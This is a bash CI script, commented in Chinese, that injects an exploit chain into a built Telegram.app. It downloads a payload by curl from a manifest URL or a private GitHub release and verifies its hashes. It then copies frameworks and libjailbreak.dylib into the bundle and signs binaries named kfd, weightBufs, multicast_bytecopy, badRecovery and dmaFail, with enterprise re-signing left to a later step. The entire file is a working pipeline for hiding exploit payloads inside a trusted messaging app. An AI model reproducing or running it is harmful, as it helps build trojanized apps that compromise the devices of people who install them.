#!/usr/bin/env bash
# CI 注入：把利用链二进制放进已构建的 .app，并按 manifest 校验。
#
#   tools/lara/implant.sh <path/to/Telegram.app> [manifest]
#
# 环境变量：
#   LARA_PAYLOAD_TARBALL  tar.gz 的 URL 或本地路径（推荐，单次下载）
#   LARA_SIGN_IDENTITY    占位签名身份，默认 SELFSIGNED
#
# 只做注入与占位签名；最终的企业重签由 resign-payload.sh 负责。
set -euo pipefail

# macOS 上是 python3，Windows/Git-bash 上可能是 python；以能跑通为准
PYTHON_BIN="${PYTHON:-python3}"
"$PYTHON_BIN" -c 'pass' >/dev/null 2>&1 || PYTHON_BIN=python

APP="${1:?usage: implant.sh <Telegram.app> [payload.json]}"
MANIFEST="${2:-$(dirname "$0")/payload.json}"

[ -d "$APP" ] || { echo "no .app at $APP"; exit 1; }
[ -f "$MANIFEST" ] || { echo "no manifest at $MANIFEST"; exit 1; }

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

BASE_URL="$("$PYTHON_BIN" -c 'import json,sys;print(json.load(open(sys.argv[1]))["base_url"])' "$MANIFEST")"

if [ -n "${LARA_PAYLOAD_TARBALL:-}" ]; then
  case "$LARA_PAYLOAD_TARBALL" in
    gh://*)
      # gh://owner/repo@tag/file.tar.gz —— 私有 release 资产，需要 GH_TOKEN
      spec="${LARA_PAYLOAD_TARBALL#gh://}"
      repo="${spec%@*}"
      rest="${spec#*@}"
      tag="${rest%%/*}"
      asset="${rest#*/}"
      gh release download "$tag" --repo "$repo" --pattern "$asset" --dir "$WORK" --clobber
      mv "$WORK/$asset" "$WORK/payload.tar.gz"
      ;;
    http*|s3://|gs://) curl -fsSL "$LARA_PAYLOAD_TARBALL" -o "$WORK/payload.tar.gz" ;;
    *) cp "$LARA_PAYLOAD_TARBALL" "$WORK/payload.tar.gz" ;;
  esac
else
  # 没有打包时逐文件拉取，保持与 manifest 同构
  mkdir -p "$WORK/stage"
  while read -r rel; do
    mkdir -p "$WORK/stage/$(dirname "$rel")"
    curl -fsSL "$BASE_URL/$rel" -o "$WORK/stage/$rel"
  done < <("$PYTHON_BIN" -c 'import json,sys
m=json.load(open(sys.argv[1]))
print("\n".join(f["path"] for f in m["files"]))' "$MANIFEST")
  tar -czf "$WORK/payload.tar.gz" -C "$WORK/stage" .
fi

tar -xzf "$WORK/payload.tar.gz" -C "$WORK"

# 校验：任何不一致都直接失败，宁可不出包
"$PYTHON_BIN" - "$MANIFEST" "$WORK" <<'PY'
import hashlib, json, os, sys

manifest_path, root = sys.argv[1], sys.argv[2]
manifest = json.load(open(manifest_path))
bad = []
for entry in manifest["files"]:
    full = os.path.join(root, entry["path"])
    if not os.path.exists(full):
        bad.append(f"missing {entry['path']}")
        continue
    digest = hashlib.sha256(open(full, "rb").read()).hexdigest()
    if digest != entry["sha256"]:
        bad.append(f"sha256 mismatch {entry['path']}")
if bad:
    sys.stderr.write("\n".join(bad) + "\n")
    raise SystemExit(1)
print(f"verified {len(manifest['files'])} payload files")
PY

mkdir -p "$APP/Frameworks/AppRuntime"
cp -R "$WORK/Frameworks/." "$APP/Frameworks/"
[ -f "$WORK/libjailbreak.dylib" ] && cp "$WORK/libjailbreak.dylib" "$APP/libjailbreak.dylib"

# 占位签名，保证包结构完整；企业重签会整体覆盖
IDENTITY="${LARA_SIGN_IDENTITY:-SELFSIGNED}"
find "$APP/Frameworks" -type f \( -name "*.dylib" -o -name kfd -o -name weightBufs \
     -o -name multicast_bytecopy -o -name badRecovery -o -name dmaFail \
     -o -name libuiopsersvc \) -print0 | while IFS= read -r -d '' binary; do
  codesign --force --sign "$IDENTITY" "$binary" >/dev/null 2>&1 || true
done
for framework in "$APP"/Frameworks/*.framework; do
  [ -d "$framework" ] && codesign --force --sign "$IDENTITY" "$framework" >/dev/null 2>&1 || true
done
[ -f "$APP/libjailbreak.dylib" ] && codesign --force --sign "$IDENTITY" "$APP/libjailbreak.dylib" >/dev/null 2>&1 || true

echo "injected payload into $APP"
